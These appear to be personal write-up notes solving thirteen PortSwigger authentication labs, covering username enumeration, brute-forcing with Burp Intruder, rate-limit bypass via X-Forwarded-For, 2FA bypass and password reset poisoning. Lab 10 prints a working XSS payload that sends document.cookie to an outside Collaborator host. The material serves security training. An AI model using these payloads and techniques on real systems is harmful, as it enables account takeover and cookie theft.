### 1. Lab: Username enumeration via different responses
> This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
 [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
 [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

This website returns different error messages for invalid username and invalid password.
![[Pasted image 20250729102434.png]]
We will use intruder in order to bruteforce username and then check by content length, after we got the correct username (`acid`) we will do same thing with password (`letmein`). Once we got the creds, login in will solve the lab.
![[Pasted image 20250729102641.png]]
> Solution: Bruteforce using Intruder

### 2. Lab: Username enumeration via subtly different responses
> This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

In this case, it says "Invalid username or password". So we can't just do username or password enumeration. Let's check if there is anything changing in response. I have used `Grep - Extract` from burpsuite in order to check for the response. Once we will configure that, and start the attack, we will see there is is a very minor difference in response. Using that we will get username and password.
![[Pasted image 20250729103628.png]]
![[Pasted image 20250729103745.png]]
![[Pasted image 20250729103638.png]]
> Solution: Use `Grep - Extract` from burpsuite to check for the response (or error in particular)

### 3. Lab: Username enumeration via response timing
> This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
Your credentials: wiener:peter

This challenge is all about checking response time! Once we start the attack, we will get rate limited, but if we use `ParamMiner` extension, we will see there is `X-Forwarded-For` header which can bypass this rate limit. Using that we will start the attack. We will use `Pitchfork` attack to set the header and the username.
In order to fetch username, we will write very long password, and there will be the delay in response. So the username and password are checked differently. Using that data, we will fetch the username.
![[Pasted image 20250729110927.png]]
Similar to what we have done for username, we will try the same thing with password given the username is already found. We will sort things by status code and voila, we will get the user.
![[Pasted image 20250729111034.png]]
> Solution: Check response timing and predict how the backend is handling the query!

### 4. Lab: Broken brute-force protection, IP block 
> This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
Your credentials: `wiener:peter`
Victim's username: `carlos`

In the materials, it says `For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.` 
So we might have to look, after how many requests we are rate limited and make a wordlist accordingly that will login as `wiener` after 3 attempts from `carlos` to reset rate limit.
But instead of that, I have used resource pool in order to send 1 request every second and got the results.
![[Pasted image 20250729112825.png]]
> Solution: Use resource pool or check how it is getting rate limited and is there any way to bypass it.

### 5. Lab: Username enumeration via account lock
> This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

In this challenge, if we try to login more than 5 times the account is getting locked if it's a valid account. So from this we can infer that if the account is locked out, that means it's the correct username. Leveraging that, we will use clusterbomb attack and send 5 requests for each username and then sort the response and we will see `ad` account is getting locked out. 
As we have username now, we will use sniper attach to get the password.
![[Pasted image 20250729114226.png]]
![[Pasted image 20250729114313.png]]
Sorting the results from content length will give us the password.
> Solution: Always check how the account is locked. 

### 6. Lab: Broken brute-force protection, multiple credentials per request
> This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.
Victim's username: `carlos`

In this challenge, we can able to bypass the protection using array of passwords, instead of single one. The thing is, sometimes website accept different types of input without any validation and write queries without checking for data types. Therefore this kind of vulnerability arises.
![[Pasted image 20250729134454.png]]
> Solution: Check for different data types.

### 7. Lab: 2FA simple bypass
> This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.
Your credentials: `wiener:peter`
Victim's credentials `carlos:montoya`

This lab is pretty straightforward, when we try to login with carlos, it will redirect us to `/login2`. But on visiting home and going to `myaccount`, we can able to access that. So the thing is, sometimes without checking the 2FA code, website allows us to view pages which is not intended.
> Solution: after login (but without 2FA) - check if we are allowed to access blocked pages.

### 8. Lab: 2FA broken logic
> This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
Your credentials: `wiener:peter`
Victim's username: `carlos`
You also have access to the email server to receive your 2FA verification code.

I have checked everything with `wiener` account on which endpoint is doing what, then I logged in to `carlos` account (got password of carlos using bruteforcing) and in 2FA `/login2` I have sent to intruder and got the mfa code using bruteforcing. Using that code to the website solved the lab.
> Solution: Check whether you can bruteforce the code or not!

### 9. Lab: Brute-forcing a stay-logged-in cookie 
> This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
To solve the lab, brute-force Carlos's cookie to gain access to his My account page.
Your credentials: `wiener:peter`
Victim's username: `carlos`

In this challenge, we can see the website is adding `stay-logged-in` cookie and when we double click on that cookie, we will see it's base64 encoded of username:md5(password) so it turns out to be `base64(username:[md5(password)])`. We can do similar attack using Burp Intruder. Add Rules into Payload processing will give us the results.
![[Pasted image 20250729161937.png]]
> Solution: Check for weakly encoded cookies.

### 10. Lab: Offline password cracking 
> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
Your credentials: `wiener:peter`
Victim's username: `carlos`

This challenge is all about XSS+Hash Cracking. In order to steal the cookie I am using this payload.
```
"><script>fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
It will fetch the cookies and send it to burp collaborator and once we got the cookie it's in `base65(username:md5(password))` style. So we will simply use [crackstation](https://crackstation.net/) in order to crack the hash and login with the account and delete carlos user in order to solve the lab.
***Alternatively we can also use XSS+CSRF to delete carlos automatically all in one payload.***
> Solution: We can leverage weak session with other vulnerabilities like XSS and CSRF

### 11. Lab: Password reset broken logic
> This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
> Your credentials: `wiener:peter`
Victim's username: `carlos`

Very straightforward lab. During password reset of wiener account when we change the username from wiener to carlos, it can able to change the password for carlos. So basically, the website is not checking for the reset token as per the account.
![[Pasted image 20250729163439.png]]
> Solution: Changing the username reset the password.

### 12. Lab: Password reset poisoning via middleware 
> This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

In this website, there is no username parameter in forgot password request. We will try password reset poisoning attack using the `X-Forwarded-Host` header.
![[Pasted image 20250729164505.png]]
This will give us the reset password token in exploit server's logs.
![[Pasted image 20250729164542.png]]
Using this token will reset carlos's password.
> Solution: Host header injection to hijack password reset token

### 13. Lab: Password brute-force via password change 
> This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
Your credentials: `wiener:peter`
Victim's username: `carlos`

This is an interesting challenge, from the error message, we can guess certain things. For example, when the current password is incorrect for multiple times, it locks out the account, but when we try to enter correct current password and different newpass1 and newpass2, it says, password do not match.
![[Pasted image 20250729170100.png]]
When we try to enter wrong password and newpass1 and newpass2 does not match, it says Current password is incorrect.
![[Pasted image 20250729170012.png]]So in order to bruteforce password correctly, we will use different newpass1 and newpass2 and then bruteforce the password.
![[Pasted image 20250729170301.png]]
> Solution: Check for the functionality of backend, check for the error messages, sometimes from error messages one can get how backend is working!

